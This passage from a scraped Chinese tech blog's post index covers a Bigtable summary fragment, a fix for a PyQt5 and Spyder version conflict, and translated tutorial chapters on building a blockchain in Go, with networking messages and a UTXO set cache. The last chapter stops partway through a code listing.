服务器采用“标记-删除”的垃圾回收方式删除 SSTable 集合中废弃的 SSTable； METADATA 表保存了 Root SSTable的集合； SSTable 的不变性使得分割 Tablet 的操作非常快捷。我们不必为每个分割出来的 Tablet 建立新的SSTable 集合，而是共享原来的 Tablet 的 SSTable 集合。 译者 作者/编著者：\n阎伟\n邮件: andy.yanwei@163.com\n博客: http://andyblog.sinaapp.com\n微博：http://weibo.com/2152410864\n","date":"2019-10-07T14:53:05+08:00","permalink":"https://lizonglingo.github.io/p/google-bigtable%E8%AE%BA%E6%96%87%E8%A6%81%E7%82%B9%E6%95%B4%E7%90%86/","title":"Google Bigtable论文要点整理"},{"content":"开发环境 Anaconda3 + Pycharm Python3.7 报错描述 我是用的Pycharm+conda的环境进行开发的，有的时候会用到Spyder。\n在我安装PyQt5后，使用Pycharm进行GUI的开发后发现，Anaconda中的Spyder打不开了：\n并有了以下报错：\nTraceback (most recent call last): File \u0026#34;D:\\Anaconda\\installanaconda\\Scripts\\spyder-script.py\u0026#34;, line 10, in sys.exit(main()) File \u0026#34;D:\\Anaconda\\installanaconda\\lib\\site-packages\\spyder\\app\\start.py\u0026#34;, line 186, in main from spyder.app import mainwindow File \u0026#34;D:\\Anaconda\\installanaconda\\lib\\site-packages\\spyder\\app\\mainwindow.py\u0026#34;, line 90, in from qtpy import QtWebEngineWidgets # analysis:ignore File \u0026#34;D:\\Anaconda\\installanaconda\\lib\\site-packages\\qtpy\\QtWebEngineWidgets.py\u0026#34;, line 22, in from PyQt5.QtWebEngineWidgets import QWebEnginePage ValueError: PyCapsule_GetPointer called with incorrect name 这个问题原来遇到过，由于没有使用Spyder的需求就一直没有想去解决。这是用于安装的PyQt5与spyder中带有的pyqt版本发生了冲突。于是我最终在stackoverflow上找到了解决方案\n解决方案 原文是这样说的：\nThe solution is to downgrade PyQt5.\npip install PyQt5==5.10.1 Collecting PyQt5==5.10.1 Downloading https://files.pythonhosted.org/packages/a7/22/67cc2bac6ae2cd3a7eabb2a2e91638b94bdc6e0503747e49670ce44bb5b0/PyQt5-5.10.1-5.10.1-cp35.cp36.cp37.cp38-none-win_amd64.whl (81.0MB) 100% |████████████████████████████████| 81.0MB 187kB/s Requirement already satisfied: sip\u0026lt;4.20,\u0026gt;=4.19.4 in c:\\anaconda3\\lib\\site-packages (from PyQt5==5.10.1) (4.19.8) spyder 3.3.4 requires pyqtwebengine\u0026lt;5.13, which is not installed. Installing collected packages: PyQt5 Found existing installation: PyQt5 5.12.1 Uninstalling PyQt5-5.12.1: Successfully uninstalled PyQt5-5.12.1 Successfully installed PyQt5-5.10.1 This problem occurs because the PyQt5 I installed is beyond version as the version of spyder.\n所以，我将原先的PyQt5进行卸载后，安装了5.10.1版本的PyQt5。\n之后对结果进行测试。\n结果 先是看一下Spyder是否正常打开以及运行：\nSpyder可以正常打开并且使用了。\n然后检查PyQt模块是否能正常使用：\n完事！\n","date":"2019-09-24T21:37:06+08:00","permalink":"https://lizonglingo.github.io/p/%E8%A7%A3%E5%86%B3pip%E5%AE%89%E8%A3%85pyqt5%E4%B9%8B%E5%90%8Espyder%E6%97%A0%E6%B3%95%E6%AD%A3%E5%B8%B8%E6%89%93%E5%BC%80%E7%9A%84%E9%97%AE%E9%A2%98/","title":"解决pip安装PyQt5之后Spyder无法正常打开的问题"},{"content":" 终于到最后一篇了~\n引言 不久之前，我们已经构建了拥有所有关键特性的区块链：匿名的、安全的并且随机产生的地址；区块链数据存储；工作量证明系统；可靠的交易存储。虽然这些特性是至关重要的，但是这还不够。真正让这些特性闪闪发光的，让加密货币成为可能的，是网络。如果一个区块链只在一台机器上运行有什么用呢？当只有一个用户时，加密货币的特性又有什么用处呢？是网络让这些所有的机制工作起来并且变的有用。\n你可以把区块链的这些特性想成规则，类似于当人们想生存并繁荣那样所建立的规则制度。一种社会准则。区块链网络是一个遵循这种规则的程序社区，它遵循的这些规则使得网络得以存活。同样的，当人们分享相同的点子，他们会变得更强大，并且能够一起建设更好的生活。如果有人遵循了不同的规则，他们将生活在分离的社会（或者说处境、团体等）。相同的，如果有区块链节点遵守了不同的规则，他将会组成一个分离的网络。\n最重要的：没有网络、没有主节点分享相同的规则，这些制度就变得无效。\n免责声明：不幸的是，我没有足够的时间去实现一个真正的P2P网络。在文章中我会展示一个大体上相同的情景，涉及到不同类型的节点。改进这种方案实现一个P2P网络会是一个很好的挑战和锻炼对你来说。同时我也不能保证除此之外的情景在本篇文章中可以实现，将来可能会做，抱歉！\n这部分涉及到重大的代码改动，没有必要对其进行全部解释在这里。请到这个页面去查看和上一个版本相比的代码改动。\n区块链网络 区块链网络是去中心化的，这就意味着没有服务器去做获得或者加工数据那样的全职和客户端的那种工作。在区块链网络中它们是节点，区块链网络中每一个节点都是全量的。一个节点就是一切：它既是客户端也是服务器。记住这个是非常重要的，因为这和常见的Web应用是非常不一样的。\n区块链网络是P2P（Peer-to-Peer）网络，这意味着节点彼此之间直接相连。它是拓扑学平面，因为这些节点中没有所谓的等级。这是它的原理图表示：\n(Business vector created by Dooder - Freepik.com)\n这种网络中的节点是很难实现的，因为它们必须执行很多操作。每个节点必须和其他很多节点互相交流，它必须请求其他节点的状态，与自己的状态相比，同时更新自己的状态。\n节点角色 尽管每个节点都是全量的，区块链节点可以扮演很多不同的角色在区块链网络中。它们是：\n矿工（Miner）\n一些节点运行在强大的专业的计算机硬件上（例如ASIC矿机），同时它们唯一的目标是尽可能的用最快的速度挖出新块。矿工是区块链中唯一可能使用工作量证明的，因为挖矿实际上意味着解决PoW难题。在PoS（Proof-of-Stake）区块链中，它们不需要挖矿。\n全节点（Full node）\n这些节点验证那些被矿工挖出来的区块也验证交易。为了做这些，它们必须有区块链的全部副本。同时，这些节点也做着类似于路由的操作，比如帮其他节点去发现别的节点。\n区块链中有多个全节点是至关重要的，因为这些节点是决策者：它们决定一个区块或者交易是否合法。\nSPV（Simplified Payment Verification简单支付验证，我们可以叫它轻节点）\nSPV是简单支付验证。这些节点不会存储一个区块链的全部副本，但是它们仍然会验证交易（不是所有的，只是一个子集，例如那些发送给特殊地址的交易）。一个SPV节点依赖一个全节点去获得信息，而且很多SPV可以连接一个全节点。SPV使得钱包应用得以实现：一个不需要下载全部的区块链，但仍然可以验证它们的交易。\n网络简化 为了实现在我们的区块链中实现网络，我们需要简化一些事情。问题在于我们没有很多计算机来模仿一个有很多节点的网络。我们不会使用虚拟机或者Docker去解决这个问题，因为这肯造成一些困难：你会需要解决一些虚拟机或者Docker问题，虽然我们的目标仅仅是集中精力于区块链的实现。所有，我们想运行多个区块链节点在一台机器上并且同一时间有多个地址。为了实现这个我们将会使用端口作为节点的标识，取代IP地址。例如，我们有以下地址的节点：127.0.0.1:3000、127.0.0.1:3001、127.0.0.1:3002等等。我们把这些端口叫做节点ID同时使用NODE_ID环境变量来设置它们。因此，你可以在多个命令行窗口中打开它们，设置不同的节点并让不同的节点运行起来。\n这个途径也需要不同的区块链和钱包文件。它们现在取决于节点ID同时被命名类似blockchain_3000.db、blockchain_30001.db和wallet_3000.db、wallet_30001.db等等这种类型。\n实现 那么，当你下载时发生什么，就是，下载比特币内核并且首次运行它们的时候发生了什么？它必须连接一些节点去下载区块链最新的状态。考虑到你的计算机不知道所有的这些，或者一些比特币节点，这些节点是什么？\n在比特币中写死一个节点是会出错的：这个节点会被攻击或者杀死，这可能导致新的节点不能加入区块链中。取而代之，比特币中，这里的DNS种子（DNS seeds）是被写死的。虽然没有节点，但是DNS服务知道一些节点的地址。当你开始启动一个干净的比特币内核时，它将会连接一个种子节点同时获取一个全节点列表，也就是下载区块链的地方。\n在我们的实现中，这里将会有一个中心化的困难。我们将有三个节点：\n中心节点。所有的其他的节点都会连接到这个节点，并且这个节点会在其他节点之间传送数据。 一个矿工节点。这个节点将在内存池中存储新的交易同时当交易达到一定数量时，它将开始新的区块。 一个钱包节点。这个节点将用来在钱包之间发送币。不同于SPV，它将存储一个区块链的全部副本。 情景 本篇文章的目标是实现以下几个场景：\n中心节点创建区块链。 其他（钱包）节点连接全节点并且下载区块链。 多个（矿工）节点连接中心节点并且下载区块链。 钱包节点创建一个交易。 矿工节点接收一个交易并且在内存池中维护它们。 当内存池中有足够多的交易时，矿工开始挖新的区块。 当新区块被挖出来时，它会被发送到中心节点。 钱包节点跟中心节点相同步。 使用钱包节点检查交易是否成功。 这是它类似于比特币的地方。尽管我们不回去构建一个真正的P2P网络，我们要实现一个真正的也是重要的用于比特币的网络。\n版本 节点通过相互通讯的方式进行交流。当新的节点开始运行时，它从一个DNS种子节点中获得几个节点，同时发送它们的版本消息，我们的实现就像下面”\ntype version struct { Version int BestHeight int AddrFrom string } 我们只有一个区块链版本，所以Version字段不会持有任何重要的信息。BestHeight存储了节点的区块链长度。AddFrom存储发送者的地址。\n接受一个version消息有什么用呢？它会用它自己的version消息响应。这类似于握手：在对方预先打招呼之前，没有任何交互的可能。这并非只是礼貌：version被用来找到区块链中更长的部分。当一个节点接收到一条 version消息，它会确认这个节点区块链是否比BastHeight的值更长。如果不是，节点会请求并下载遗失的区块。\n为了接受消息，我们需要一个服务：\nvar nodeAddress string var knownNodes = []string{\u0026#34;localhost:3000\u0026#34;} func StartServer(nodeID, minerAddress string) { nodeAddress = fmt.Sprintf(\u0026#34;localhost:%s\u0026#34;, nodeID) miningAddress = minerAddress ln, err := net.Listen(protocol, nodeAddress) defer ln.Close() bc := NewBlockchain(nodeID) if nodeAddress != knownNodes[0] { sendVersion(knownNodes[0], bc) } for { conn, err := ln.Accept() go handleConnection(conn, bc) } } 首先，我们写死中心节点的地址：每个节点必须知道去哪里连接它进行初始化。minerAddress参数指定了接受挖矿奖励的地址。这个部分：\nif nodeAddress != knownNodes[0] { sendVersion(knownNodes[0], bc) } 表明如果当前的节点不是中心节点，它必须发送version消息给中心节点去查看是否它的区块链过时了。\nfunc sendVersion(addr string, bc *Blockchain) { bestHeight := bc.GetBestHeight() payload := gobEncode(version{nodeVersion, bestHeight, nodeAddress}) request := append(commandToBytes(\u0026#34;version\u0026#34;), payload...) sendData(addr, request) } 我们的通讯，在低层次来说是字节序列。首先12字节指明命令的名字（这个例子中是version），同时后面的字节将包含gob-encoded消息结构。commandToBytes看起来是这样：\nfunc commandToBytes(command string) []byte { var bytes [commandLength]byte for i, c := range command { bytes[i] = byte(c) } return bytes[:] } 它创建了12字节的缓冲区并且用命令名字填满，剩下的字节空闲。这是一个对立的函数：\nfunc bytesToCommand(bytes []byte) string { var command []byte for _, b := range bytes { if b != 0x0 { command = append(command, b) } } return fmt.Sprintf(\u0026#34;%s\u0026#34;, command) } 当一个节点接收命令，它运行bytesToCommand去摘取命令名字同时使用正确的方法处理命令体：\nfunc handleConnection(conn net.Conn, bc *Blockchain) { request, err := ioutil.ReadAll(conn) command := bytesToCommand(request[:commandLength]) fmt.Printf(\u0026#34;Received %s command\\n\u0026#34;, command) switch command { ... case \u0026#34;version\u0026#34;: handleVersion(request, bc) default: fmt.Println(\u0026#34;Unknown command!\u0026#34;) } conn.Close() } 好的，这是version命令处理看起来的样子：\nfunc handleVersion(request []byte, bc *Blockchain) { var buff bytes.Buffer var payload verzion buff.Write(request[commandLength:]) dec := gob.NewDecoder(\u0026amp;buff) err := dec.Decode(\u0026amp;payload) myBestHeight := bc.GetBestHeight() foreignerBestHeight := payload.BestHeight if myBestHeight \u0026lt; foreignerBestHeight { sendGetBlocks(payload.AddrFrom) } else if myBestHeight \u0026gt; foreignerBestHeight { sendVersion(payload.AddrFrom, bc) } if !nodeIsKnown(payload.AddrFrom) { knownNodes = append(knownNodes, payload.AddrFrom) } } 首先，我们需要进行解码并且摘取有效部分。这像其他的所有处理方法（或许我们可以叫处理器）一样，所有我将会在未来省略这些代码片段。\n然后一个节点根据通讯消息中的那个比较BestHeight。如果节点的区块链更长，它会回复version消息；否则，它会发送getblocks消息。\ngetblocks type getblocks struct { AddrFrom string } getblocks意味着“给我看看你有的区块”（在比特币中，这非常复杂）。主要，它不会说“把你的所有区块给我”，而是请求一个区块哈希列表。这会降低网络负载，因为区块可以被从其他节点下载，同时我们也不想从单一节点下载几十Gb的数据。\n处理命令很简单，像下面：\nfunc handleGetBlocks(request []byte, bc *Blockchain) { ... blocks := bc.GetBlockHashes() sendInv(payload.AddrFrom, \u0026#34;block\u0026#34;, blocks) } 在我们的简单实现中，它会返回所有的区块哈希。\ninv type inv struct { AddrFrom string Type string Items [][]byte } 比特币使用inv来像其他节点展示当前节点有哪些区块和交易。重申，它不会包含全部的区块和交易，仅仅是它们的哈希。这个Type字段代表这是个区块还是个交易。\n处理inv是比较困难的：\nfunc handleInv(request []byte, bc *Blockchain) { ... fmt.Printf(\u0026#34;Recevied inventory with %d %s\\n\u0026#34;, len(payload.Items), payload.Type) if payload.Type == \u0026#34;block\u0026#34; { blocksInTransit = payload.Items blockHash := payload.Items[0] sendGetData(payload.AddrFrom, \u0026#34;block\u0026#34;, blockHash) newInTransit := [][]byte{} for _, b := range blocksInTransit { if bytes.Compare(b, blockHash) != 0 { newInTransit = append(newInTransit, b) } } blocksInTransit = newInTransit } if payload.Type == \u0026#34;tx\u0026#34; { txID := payload.Items[0] if mempool[hex.EncodeToString(txID)].ID == nil { sendGetData(payload.AddrFrom, \u0026#34;tx\u0026#34;, txID) } } } 如果区块哈希被转移了，我们要在blocksInTransit变量中存储它们来溯源下载区块。这允许我们在不同的节点中下载区块。刚好在把区块放进迁移状态中，我们发送getdata命令去发送inv命令同时更新blocksInTransit。在真正的P2P网络中，我们将会在不同的节点传送区块。\n在我们的实现中，我们将不会发送带有很多哈希的inv。这就是为什么payload.Type == \u0026quot;tx\u0026quot;只获取了第一个哈希。接下来我们检查在我们的内存池中是否有哈希，如果没有getdata消息就会被发送。\ngetdata type getdata struct { AddrFrom string Type string ID []byte } getdata是一个对特定区块或者交易请求，同时它可以只包含一个区块/交易ID。\nfunc handleGetData(request []byte, bc *Blockchain) { ... if payload.Type == \u0026#34;block\u0026#34; { block, err := bc.GetBlock([]byte(payload.ID)) sendBlock(payload.AddrFrom, \u0026amp;block) } if payload.Type == \u0026#34;tx\u0026#34; { txID := hex.EncodeToString(payload.ID) tx := mempool[txID] sendTx(payload.AddrFrom, \u0026amp;tx) } } 这个处理器很直接：如果它们请求一个区块，返回这个区块；如果它们请求一个交易，返回这个交易。注意，我们不会检查我们是否拥有这个区块或者交易。这是一个瑕疵：）\nblock 和 tx type block struct { AddrFrom string Block []byte } type tx struct { AddFrom string Transaction []byte } 这些消息是真正的传输数据的。\n处理block消息是简单：\nfunc handleBlock(request []byte, bc *Blockchain) { ... blockData := payload.Block block := DeserializeBlock(blockData) fmt.Println(\u0026#34;Recevied a new block!\u0026#34;) bc.AddBlock(block) fmt.Printf(\u0026#34;Added block %x\\n\u0026#34;, block.Hash) if len(blocksInTransit) \u0026gt; 0 { blockHash := blocksInTransit[0] sendGetData(payload.AddrFrom, \u0026#34;block\u0026#34;, blockHash) blocksInTransit = blocksInTransit[1:] } else { UTXOSet := UTXOSet{bc} UTXOSet.Reindex() } } 当我们接受一个区块，我们把它放进我们的区块。如果这里有更多的区块被下载，我们在相同的节点请求下载先前的区块。我们最终下载全部的区块，这个UTXO集合被重新索引。\nTODO: 替换掉无条件的信任，我们应该在把它们添加到区块链中之前验证每个区块。\nTODO: 替换掉执行UTXOSet.Reindex()的部分, 应该用UTXOSet.Update(block)，因为区块链太大了。重新索引整个 UTXO 集合会占用大量的时间。\n处理tx消息是非常困难的部分：\nfunc handleTx(request []byte, bc *Blockchain) { ... txData := payload.Transaction tx := DeserializeTransaction(txData) mempool[hex.EncodeToString(tx.ID)] = tx if nodeAddress == knownNodes[0] { for _, node := range knownNodes { if node != nodeAddress \u0026amp;\u0026amp; node != payload.AddFrom { sendInv(node, \u0026#34;tx\u0026#34;, [][]byte{tx.ID}) } } } else { if len(mempool) \u0026gt;= 2 \u0026amp;\u0026amp; len(miningAddress) \u0026gt; 0 { MineTransactions: var txs []*Transaction for id := range mempool { tx := mempool[id] if bc.VerifyTransaction(\u0026amp;tx) { txs = append(txs, \u0026amp;tx) } } if len(txs) == 0 { fmt.Println(\u0026#34;All transactions are invalid! Waiting for new ones...\u0026#34;) return } cbTx := NewCoinbaseTX(miningAddress, \u0026#34;\u0026#34;) txs = append(txs, cbTx) newBlock := bc.MineBlock(txs) UTXOSet := UTXOSet{bc} UTXOSet.Reindex() fmt.Println(\u0026#34;New block is mined!\u0026#34;) for _, tx := range txs { txID := hex.EncodeToString(tx.ID) delete(mempool, txID) } for _, node := range knownNodes { if node != nodeAddress { sendInv(node, \u0026#34;block\u0026#34;, [][]byte{newBlock.Hash}) } } if len(mempool) \u0026gt; 0 { goto MineTransactions } } } } 第一件事是把新的交易放到内存池中（重申，交易必须在放入交易池之前经过验证）。下一个部分：\nif nodeAddress == knownNodes[0] { for _, node := range knownNodes { if node != nodeAddress \u0026amp;\u0026amp; node != payload.AddFrom { sendInv(node, \u0026#34;tx\u0026#34;, [][]byte{tx.ID}) } } } 检查当前的节点是不是中心节点。在我们的实现中中心节点不会挖矿。取而代之的，它会发送新的交易给网络中的其他节点。\n下一个较大的部分仅仅是挖矿节点。让我们分成小部分来看：\nif len(mempool) \u0026gt;= 2 \u0026amp;\u0026amp; len(miningAddress) \u0026gt; 0 { miningAddress只设置挖矿节点。当目前的矿工节点内存池中存在两条或者更多的交易时，挖矿开始。\nfor id := range mempool { tx := mempool[id] if bc.VerifyTransaction(\u0026amp;tx) { txs = append(txs, \u0026amp;tx) } } if len(txs) == 0 { fmt.Println(\u0026#34;All transactions are invalid! Waiting for new ones...\u0026#34;) return } 首先，内存池中的所有交易被验证。不合法的交易会被忽略，同时如果这里没有合法的交易，挖矿会被中断。\ncbTx := NewCoinbaseTX(miningAddress, \u0026#34;\u0026#34;) txs = append(txs, cbTx) newBlock := bc.MineBlock(txs) UTXOSet := UTXOSet{bc} UTXOSet.Reindex() fmt.Println(\u0026#34;New block is mined!\u0026#34;) 验证过的交易被放入区块中，就像铸币交易那样获得奖励。在挖出新块之后，UTXO集合被重新索引。\nTODO：重申，UTXOSet.Update应该替换UTXOSet.Reindex。\nfor _, tx := range txs { txID := hex.EncodeToString(tx.ID) delete(mempool, txID) } for _, node := range knownNodes { if node != nodeAddress { sendInv(node, \u0026#34;block\u0026#34;, [][]byte{newBlock.Hash}) } } if len(mempool) \u0026gt; 0 { goto MineTransactions } 在交易被挖出后，它被从内存池中移除。当前节点知道的其他节点，收到带有新区块哈希的inv消息。在处理了这条消息后，它们可以请求这个区块。\n结果 让我们演示一下此前定义的场景。\n首先，在第一个终端窗口设置NODE_ID为3000（export NODE_ID=3000）。我将会使用类似于NODE 3000或者NODE 3001在接下来的部分，你得知道哪个节点做什么。\nNOED 3000 创建一个钱包和一个新链：\n$ blockchain_go createblockchain -address CENTREAL_NODE (我将使用假地址因为表述方便清晰)\n之后，区块链包含了一个创世纪块。我们需要存储这个区块并且在其他节点中使用。创世纪块作为区块链的标识（在比特币内核中，创世纪块是被写死的）。\n$ cp blockchain_3000.db blockchain_genesis.db NODE 3001 接下来，打开一个新的终端窗口设置节点ID为3001。这会是一个钱包节点。使用blockchain_go createwallet产生一些地址，我们叫这些地址WALLET_1，WALLET_2，WALLET_3。\nNODE 3000 发送一些币给这些钱包地址：\n$ blockchain_go send -from CENTREAL_NODE -to WALLET_1 -amount 10 -mine $ blockchain_go send -from CENTREAL_NODE -to WALLET_2 -amount 10 -mine -mine标识意味区块被当前节点及时挖矿。我们需要这个参数因为最初网络中没有挖矿节点。\n运行节点：\n$ blockchain_go startnode 这个节点必须一直运行直到使用场景结束。\nNODE 3001 使用上面保存的创世纪块初始区块链：\n$ cp blockchain_genesis.db blockchain_3001.db 运行节点：\n$ blockchain_go startnode 它将会从中心节点中下载所有区块。去检查每件事情是否ok，停下节点检查一下余额：\n$ blockchain_go getbalance -address WALLET_1 Balance of \u0026#39;WALLET_1\u0026#39;: 10 $ blockchain_go getbalance -address WALLET_2 Balance of \u0026#39;WALLET_2\u0026#39;: 10 同时，我们可以在CENTRAL_NODE地址中检查余额，因为3001节点中有它的区块链了：\n$ blockchain_go getbalance -address CENTRAL_NODE Balance of \u0026#39;CENTRAL_NODE\u0026#39;: 10 NODE 3002 打开一个新的终端窗口设置节点ID为3002，产生一个钱包。这将会是一个挖矿节点。初始化这个区块链：\n$ cp blockchain_genesis.db blockchain_3002.db 运行节点：\n$ blockchain_go startnode -miner MINER_WALLET NODE 3001 发送一个币：\n$ blockchain_go send -from WALLET_1 -to WALLET_3 -amount 1 $ blockchain_go send -from WALLET_2 -to WALLET_4 -amount 1 NODE 3002 速速！转到矿工节点能看到它正在挖一个区块！同时，检查中心节点的输出。\nNOED 3001 切换的钱包节点并运行它：\n$ blockchain_go startnode 它将会下载新的区块！\n停下来检查余额：\n$ blockchain_go getbalance -address WALLET_1 Balance of \u0026#39;WALLET_1\u0026#39;: 9 $ blockchain_go getbalance -address WALLET_2 Balance of \u0026#39;WALLET_2\u0026#39;: 9 $ blockchain_go getbalance -address WALLET_3 Balance of \u0026#39;WALLET_3\u0026#39;: 1 $ blockchain_go getbalance -address WALLET_4 Balance of \u0026#39;WALLET_4\u0026#39;: 1 $ blockchain_go getbalance -address MINER_WALLET Balance of \u0026#39;MINER_WALLET\u0026#39;: 10 这就是了！\n总结 这是本系列的最后一部分了。我可以出更多的文章来实现一个真正的P2P网络原型，但是我没有时间去做这些了。我希望这些文章回答了你一些关于比特币的技术问题并产生了新的问题，你可以自己去寻找答案。在比特币技术中还有更多有趣的事情隐藏在其中！祝你好运！\nP.S. 你可以通过实现addr消息来开始改进这个网络，就像是比特币网络协议中所描述的那样(链接在下面)。这是非常重要的消息，因为这使得节点可以发现彼此。我已经开始着手实现它了，但是还没完成！\nLinks:\nSource codes Bitcoin protocol documentation Bitcoin network 最后 用了18天的时间，断断续续实现了这个简化的加密货币系统，翻完了这系列的微博。其中存在的一些错误和不足希望大家与我交流，谢谢包容！\n最重要的，感谢本系列博客原作和我发现的首位将其翻译成中文的博主，下面是他们的连接：\nIvan Kuznetsov AnnatarHe 以及Github上的中文翻译版本：\nliuchengxu/blockchain-tutorial 感谢以上，让我初步真正的探索到区块链及比特币技术的底层世界。在未来，我会对我从接触区块链到现在写出并理解一个简单底层系统原型的路程做一个小总结，为有需要朋友提供入门指南。\n路还很长，不过已经上路了！加油！\n","date":"2019-09-22T08:38:35+08:00","permalink":"https://lizonglingo.github.io/p/%E4%BD%BF%E7%94%A8golang%E6%9E%84%E5%BB%BA%E5%8C%BA%E5%9D%97%E9%93%BEpart7%E7%BD%91%E7%BB%9C/","title":"使用Golang构建区块链Part7：网络"},{"content":" 最近事情比较多，这一篇现在才更。又开始忙起来了~在本篇文章所涉及到的代码实现中，大部分改动相比之前的在条理和逻辑上更加清晰。\n引言 在本系列文章中的最开始，我说过区块链是一个分布式数据库。那时，我们决定先跳过“分布式”的部分而把精力放到“数据库”相关的内容。不久之前，我们几乎已经实现了所有的关于数据库部分的内容。在这篇文章中，会覆盖到先前我们跳过的一些机制，同时在下一篇文章中，我们会开始着手于区块链的分布式特性。\n先前的章节：\nBasic Prototype Proof-of-Work Persistence and CLI Transactions 1 Addresses （原文地址可能无法访问）\n本部分只介绍有重大变化的代码，所以在这里将它们全部进行解释是没有必要的。请根据这个页面去看代码的变动（与上一篇文章比较）。\n奖励 在先前的文章中，我们跳过了一个很细微的细节就是挖矿奖励。现在我们具有了实现它的一切。\n这个奖励是仅仅是一个coinbase交易。当一个挖矿节点开始挖一个新的区块时，它收集队列中的交易同时为它们准备一个coinbase交易。这个coinbase交易仅仅包含一个矿工公钥哈希的输出。\n实现奖励和更新send命令一样简单：\nfunc (cli *CLI) send(from, to string, amount int) { ... bc := NewBlockchain() UTXOSet := UTXOSet{bc} defer bc.db.Close() tx := NewUTXOTransaction(from, to, amount, \u0026amp;UTXOSet) cbTx := NewCoinbaseTX(from, \u0026#34;\u0026#34;) txs := []*Transaction{cbTx, tx} newBlock := bc.MineBlock(txs) fmt.Println(\u0026#34;Success!\u0026#34;) } 在我们的实现中，创建交易挖出新块的那一个（矿工）会获得奖励。\nUTXO 集合 在第三部分持久化和命令行接口中，我们学习了比特币内核将区块存储到数据库的方式。它讲到区块都是存储在blocks数据库的，交易出账是存储在chainstate数据库的。让我提醒你一下chainstate的结构是什么样的：\n\u0026lsquo;c\u0026rsquo; + 32位交易哈希 -\u0026gt; 交易的未花费交易输出记录 \u0026lsquo;B\u0026rsquo; + 32位区块哈希 -\u0026gt; 数据库中代表未花费交易输出的区块哈希 至这一篇文章，我们已经实现了交易，但是我们并没有去使用chainstate去存储它们的输出。所以，这就是我们现在要去做的。\nchainstate不会去存储交易。取而代之的，它存储一个叫UTXO的集合，或者说是未花费交易输出的集合。除此之外，它存储了“数据库表示的未花费交易输出的区块哈希”，这儿我们先暂时省略，因为我们还没有使用区块高度（但是我们会在下一篇文章中进行实现）。\n所以，为什么我要去实现UTXO集合呢？\n考虑到我们先前实现的Blockchain.FindUnspentTransactions方法：\nfunc (bc *Blockchain) FindUnspentTransactions(pubKeyHash []byte) []Transaction { ... bci := bc.Iterator() for { block := bci.Next() for _, tx := range block.Transactions { ... } if len(block.PrevBlockHash) == 0 { break } } ... } 这个函数寻找还有未花费输出的交易。因为交易是存储在区块中的，它迭代区块链中的每一个区块同时检查里面的每一个交易。在2017年9月18日是，比特币中就已经有485,860个区块了，整个数据库使用了140+Gb的磁盘空间。这意味着一个人需要运行整个节点去验证交易。此外，验证交易需要迭代很多区块。\n这个问题的解决方案就是，只为存储的未花费出账建立一个索引，这就是UTXO集合所做的事情：这就是一个从所有区块链交易中所建立的一个高速缓存（通过迭代所有区块，是的，但是只需要做一次），在后面也用这个来计算余额以及验证新的交易。2017年9月的时候，UTXO集合需要大概2.7Gb。\n好的，让我们想想我们实现UTXO集合的话需要做哪些改变。目前，下面的函数是用来寻找交易的：\nBlockchain.FindUnspentTransactions - 主要功能是寻找含有未花费交易输出的交易。这是遍历所有区块的地方。 Blockchain.FindSpendableOutputs - 这个函数在一个新的交易被创建时被使用。如果找到的数额足够出账的需求。使用Blockchain.FindUnspentTransactions。 Blockchain.FindUTXO - 为一个公钥哈希寻找未花费交易输出，用来获取余额。使用了Blockchain.FindUnspentTransactions。 Blockchain.FindTransaction - 通过一个交易的ID在区块链中寻找这个交易。它迭代所有区块去直至找到它。 正如你所看到的，所有的方法都迭代了数据库中的所有区块。但是我们现在不能改进它们，因为UTXO集合没有存储所有的交易，仅仅存储了那些包含未花费交易输出的。因此，它不能被用于Blockchain.FindTransaction。\n所以，我们需要下面的这些方法：\nBlockchain.FindUTXO - 通过迭代区块寻找所有的未花费出账。 UTXOSet.Reindex - 使用FindUTXO去寻找未花费出账，并且将它们存储到数据库中。这儿就是产生缓存的地方。 UTXOSet.FindSpendableOutputs - 这个方法模仿了Blockchain.FindSpendableOutputs方法，只不过使用了UTXO集合。 UTXOSet.FindUTXO - 这个方法模仿了Blockchain.FindUTXO方法，同样的只不过使用的是UTXO集合。 Blockchain.FindTransaction和之前的一样。 因此，最常使用的两个函数将从现在起使用到高速缓存！\n让我们开始coding！\ntype UTXOSet struct { Blockchain *Blockchain } 我们将会使用一个单独的数据库，但是我们将会把UTXO集合存储到一个不同的bucket里。因此，UTXO是和Blockchain成对的。\nfunc (u UTXOSet) Reindex() { db := u.Blockchain.db bucketName := []byte(utxoBucket) err := db.Update(func(tx *bolt.Tx) error { err := tx.DeleteBucket(bucketName) _, err = tx.CreateBucket(bucketName) }) UTXO := u.Blockchain.FindUTXO() err = db.Update(func(tx *bolt.Tx) error { b := tx.Bucket(bucketName) for txID, outs := range UTXO { key, err := hex.DecodeString(txID) err = b.Put(key, outs.Serialize()) } }) } 这个方法创建了一个原始的UTXO集合。首先，如果它存在一个bucket的话讲首先将它移除，然后从区块链上寻找所有的未花费交易输出，最后将这些出账存储到bucket里。\nBlockchain.FindUTXO方法几乎和Blockchain.FindUnspentTransactions是相同的，但是现在它返回一个TransactionID 到TransactionOutputs的Map（映射）结构。\n现在，UTXO集合可以被用来发送币：\nfunc (u UTXOSet) FindSpendableOutputs(pubkeyHash []byte, amount int) (int, map[string][]int) { unspentOutputs := make(map[string][]int) accumulated := 0 db := u.Blockchain.db err := db.View(func(tx *bolt.Tx) error { b := tx.Bucket([]byte(utxoBucket)) c := b.Cursor() for k, v := c.First(); k != nil; k, v = c.Next() { txID := hex.EncodeToString(k) outs := DeserializeOutputs(v) for outIdx, out := range outs.Outputs { if out.IsLockedWithKey(pubkeyHash) \u0026amp;\u0026amp; accumulated \u0026lt; amount { accumulated += out.Value unspentOutputs[txID] = append(unspentOutputs[txID], outIdx) } } } }) return accumulated, unspentOutputs } 或者用来查询余额：\nfunc (u UTXOSet) FindUTXO(pubKeyHash []byte) []TXOutput { var UTXOs []TXOutput db := u.Blockchain.db err := db.View(func(tx *bolt.Tx) error { b := tx.Bucket([]byte(utxoBucket)) c := b.Cursor() for k, v := c.First(); k != nil; k, v = c.Next() { outs := DeserializeOutputs(v) for _, out := range outs.Outputs { if out.IsLockedWithKey(pubKeyHash) { UTXOs = append(UTXOs, out) } } } return nil }) return UTXOs } 这些是对于相应的Blockchain方法相应的微改的版本。这些Blockchain方法不再需要了。\n拥有UTXO集合意味着我们数据（交易）是分开去存储的：实际上交易是存储在区块链中的，同时未花费交易输出是存储在UTXO集合中。这样的分开（存储）需要很强的同步机制，因为我们想要UTXO集合总是被更新同时存储最近的交易出账。但是我们不想在每次新块被挖出的时候重建索引，因为我们要避免的正是这种频繁的区块链扫描。因此，我们需要一个更新UTXO集合的机制：\nfunc (u UTXOSet) Update(block *Block) { db := u.Blockchain.db err := db.Update(func(tx *bolt.Tx) error { b := 